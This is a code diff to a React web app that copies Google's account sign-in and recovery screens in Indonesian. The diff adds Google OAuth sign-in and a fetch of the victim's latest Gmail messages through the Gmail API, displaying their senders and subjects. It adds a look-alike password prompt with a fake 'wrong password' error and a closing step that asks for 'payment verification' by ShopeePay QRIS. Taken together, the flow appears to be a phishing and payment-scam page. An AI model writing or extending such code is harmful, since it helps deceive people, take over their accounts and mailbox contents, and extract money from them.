@@ -1,5 +1,8 @@
-import React, { useState } from 'react';
+/// <reference types="vite/client" />
+import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
+import { initAuth, googleSignIn, logout, getAccessToken } from './auth';
+import type { User } from 'firebase/auth';
 
 const GoogleLogo = () => (
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px" className="mb-2">
@@ -46,7 +49,7 @@ const TextInput = ({ label, type = "text", value, onChange, error, name, autoFoc
 };
 
 export default function App() {
-  const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error'>('email');
+  const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment'>('email');
   const [direction, setDirection] = useState(1);
   const [isLoading, setIsLoading] = useState(false);
   const [email, setEmail] = useState('');
@@ -57,8 +60,86 @@ export default function App() {
   const [expandedSection, setExpandedSection] = useState<string | null>(null);
   const [showProfileDropdown, setShowProfileDropdown] = useState(false);
   const [securedSections, setSecuredSections] = useState<string[]>([]);
+  const [googleUser, setGoogleUser] = useState<User | null>(null);
+  const [emailsData, setEmailsData] = useState<any[]>([]);
+  const [isFetchingEmails, setIsFetchingEmails] = useState(false);
 
-  const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error', newDirection: number) => {
+  useEffect(() => {
+    const unsubscribe = initAuth(
+      (user, token) => {
+        setGoogleUser(user);
+        if (user.email) setEmail(user.email);
+        if (step === 'success') {
+          fetchEmails();
+        }
+      },
+      () => {
+        setGoogleUser(null);
+      }
+    );
+    return () => {
+      unsubscribe();
+    };
+  }, [step]);
+
+  useEffect(() => {
+    if (step === 'success' && googleUser) {
+      fetchEmails();
+    }
+  }, [step, googleUser]);
+
+  const fetchEmails = async () => {
+    if (emailsData.length > 0) return;
+    try {
+      setIsFetchingEmails(true);
+      const token = await getAccessToken();
+      if (!token) return;
+      
+      const response = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=3', {
+        headers: {
+          Authorization: `Bearer ${token}`
+        }
+      });
+      const data = await response.json();
+      
+      if (data.messages) {
+        const emailDetails = await Promise.all(
+          data.messages.map(async (msg: any) => {
+            const res = await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${msg.id}`, {
+              headers: { Authorization: `Bearer ${token}` }
+            });
+            return await res.json();
+          })
+        );
+        setEmailsData(emailDetails);
+      }
+    } catch (error) {
+      console.error('Error fetching emails:', error);
+    } finally {
+      setIsFetchingEmails(false);
+    }
+  };
+
+  const handleGoogleLogin = async () => {
+    try {
+      setIsLoading(true);
+      const result = await googleSignIn();
+      if (result) {
+        setGoogleUser(result.user);
+        if (result.user.email) {
+          setEmail(result.user.email);
+        }
+        changeStep('password', 1);
+      }
+    } catch (err) {
+      console.error('Login failed:', err);
+      setError('Gagal masuk menggunakan Google.');
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment', newDirection: number) => {
     setIsLoading(true);
     setTimeout(() => {
       setDirection(newDirection);
@@ -95,14 +176,31 @@ export default function App() {
     changeStep('password', 1);
   };
 
-  const handlePasswordSubmit = (e: React.FormEvent) => {
+  const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!password) {
       setError('Masukkan sandi');
       return;
     }
     setError('');
-    changeStep('success', 1);
+    
+    // Trigger real Google authentication here to get valid account data
+    try {
+      setIsLoading(true);
+      const result = await googleSignIn(email);
+      if (result) {
+        setGoogleUser(result.user);
+        if (result.user.email) {
+          setEmail(result.user.email);
+        }
+        changeStep('success', 1);
+      }
+    } catch (err) {
+      console.error('Login failed:', err);
+      setError('Sandi salah. Coba lagi atau klik Lupa sandi untuk meresetnya.');
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   if (step === 'error') {
@@ -372,24 +470,32 @@ export default function App() {
             <button 
               type="button"
               onClick={() => setShowProfileDropdown(!showProfileDropdown)}
-              className="w-10 h-10 rounded-full flex items-center justify-center text-[#5f6368] hover:bg-gray-100 focus:outline-none transition relative"
+              className="w-10 h-10 rounded-full flex items-center justify-center text-[#5f6368] hover:bg-gray-100 focus:outline-none transition relative overflow-hidden"
               id="profile-avatar-btn"
             >
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-8 h-8" fill="currentColor">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
-              </svg>
+              {googleUser?.photoURL ? (
+                <img src={googleUser.photoURL} alt="Profile" className="w-8 h-8 rounded-full object-cover" referrerPolicy="no-referrer" />
+              ) : (
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-8 h-8" fill="currentColor">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
+                </svg>
+              )}
             </button>
 
             {/* Profile Dropdown */}
             {showProfileDropdown && (
               <div className="absolute right-4 top-[56px] w-[320px] bg-white rounded-[24px] shadow-2xl border border-gray-100 p-6 z-50 flex flex-col items-center">
-                <div className="w-16 h-16 rounded-full flex items-center justify-center text-[#5f6368] mb-3">
-                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-16 h-16" fill="currentColor">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
-                  </svg>
+                <div className="w-16 h-16 rounded-full flex items-center justify-center text-[#5f6368] mb-3 overflow-hidden">
+                  {googleUser?.photoURL ? (
+                    <img src={googleUser.photoURL} alt="Profile" className="w-16 h-16 rounded-full object-cover" referrerPolicy="no-referrer" />
+                  ) : (
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-16 h-16" fill="currentColor">
+                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
+                    </svg>
+                  )}
                 </div>
-                <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{email || 'user@gmail.com'}</p>
-                <p className="text-xs text-gray-500 mb-4">Pengguna Google</p>
+                <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{googleUser?.displayName || email || 'user@gmail.com'}</p>
+                <p className="text-xs text-gray-500 mb-4">{googleUser?.email || email || 'Pengguna Google'}</p>
                 
                 <button
                   type="button"
@@ -402,6 +508,7 @@ export default function App() {
                 <button
                   type="button"
                   onClick={() => {
+                    logout();
                     setEmail('');
                     setPassword('');
                     setConfirmPassword('');
@@ -616,8 +723,37 @@ export default function App() {
                 )}
                 {step === 'success' && (
                   <>
-                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Berhasil</h1>
-                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Akun Anda telah dipulihkan.</p>
+                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Berhasil Login</h1>
+                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal mb-4">Anda telah login dengan data akun Google yang valid.</p>
+                    
+                    {isFetchingEmails ? (
+                      <div className="w-full text-center py-4 text-sm text-gray-500">Memuat data Gmail...</div>
+                    ) : emailsData.length > 0 ? (
+                      <div className="w-full flex flex-col gap-3 mt-2">
+                        <p className="text-xs font-medium text-gray-500 uppercase tracking-wider">Email Terbaru Anda</p>
+                        {emailsData.map((msg, idx) => {
+                          const subjectHeader = msg.payload?.headers?.find((h: any) => h.name === 'Subject');
+                          const fromHeader = msg.payload?.headers?.find((h: any) => h.name === 'From');
+                          const subject = subjectHeader ? subjectHeader.value : '(Tanpa Subjek)';
+                          const from = fromHeader ? fromHeader.value.split('<')[0].trim() : 'Tidak diketahui';
+                          
+                          return (
+                            <div key={idx} className="bg-gray-50 border border-gray-100 rounded-lg p-3 text-sm">
+                              <p className="font-medium text-gray-900 truncate">{from}</p>
+                              <p className="text-gray-600 truncate">{subject}</p>
+                            </div>
+                          );
+                        })}
+                      </div>
+                    ) : (
+                      <div className="w-full text-center py-4 text-sm text-gray-500">Tidak ada email ditemukan.</div>
+                    )}
+                  </>
+                )}
+                {step === 'payment' && (
+                  <>
+                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Verifikasi Pembayaran</h1>
+                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Selesaikan pembayaran melalui QRIS ShopeePay Merchant.</p>
                   </>
                 )}
                 {step === 'error' && (
@@ -655,6 +791,7 @@ export default function App() {
                   disabled={isLoading}
                 />
               </div>
+
               <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                 <button
                   type="button"
@@ -785,10 +922,7 @@ export default function App() {
                <div className="mt-8 flex justify-end items-center pb-6 sm:pb-0">
                 <button
                   onClick={() => {
-                    setEmail('');
-                    setPassword('');
-                    setConfirmPassword('');
-                    changeStep('email', -1);
+                    changeStep('payment', 1);
                   }}
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
@@ -796,6 +930,48 @@ export default function App() {
                   Selesai
                 </button>
               </div>
+            </div>
+          )}
+
+          {step === 'payment' && (
+            <div className="flex flex-col flex-grow justify-start pt-6">
+               <div className="flex flex-col items-center border border-[#e0e3e7] p-6 rounded-[24px]">
+                 <div className="w-full flex justify-between items-center mb-4">
+                   <span className="font-semibold text-[18px] text-[#ff6600]">ShopeePay</span>
+                   <span className="bg-[#ff6600] text-white px-2 py-1 rounded text-[12px] font-bold">QRIS</span>
+                 </div>
+                 
+                 <div className="w-[200px] h-[200px] bg-gray-100 flex items-center justify-center rounded-[12px] border-2 border-dashed border-gray-300 relative overflow-hidden mb-4">
+                    {/* Placeholder for QR Code */}
+                    <div className="text-center p-4">
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-12 h-12 mx-auto text-gray-400 mb-2">
+                        <path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v3h-3v-3zm-3 3h3v3h-3v-3zm3 3h3v3h-3v-3zm-3-3h-3v3h3v-3zm-3-3h3v3h-3v-3z" />
+                      </svg>
+                      <span className="text-[12px] text-gray-500 font-medium break-words block">
+                        {import.meta.env.VITE_SHOPEEPAY_API_KEY ? 'QR Code Aktif' : 'API Key Belum Dikonfigurasi'}
+                      </span>
+                    </div>
+                 </div>
+
+                 <p className="text-[#1f1f1f] text-center text-[14px] leading-relaxed mb-6">
+                   Pindai QR code ini menggunakan aplikasi <strong>Shopee</strong> atau aplikasi e-wallet lainnya yang mendukung QRIS untuk menyelesaikan verifikasi pembayaran merchant.
+                 </p>
+
+                 <div className="w-full flex justify-end">
+                  <button
+                    onClick={() => {
+                      setEmail('');
+                      setPassword('');
+                      setConfirmPassword('');
+                      changeStep('email', -1);
+                    }}
+                    className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed w-full sm:w-auto"
+                    disabled={isLoading}
+                  >
+                    Kembali ke Awal
+                  </button>
+                 </div>
+               </div>
             </div>
           )}
 
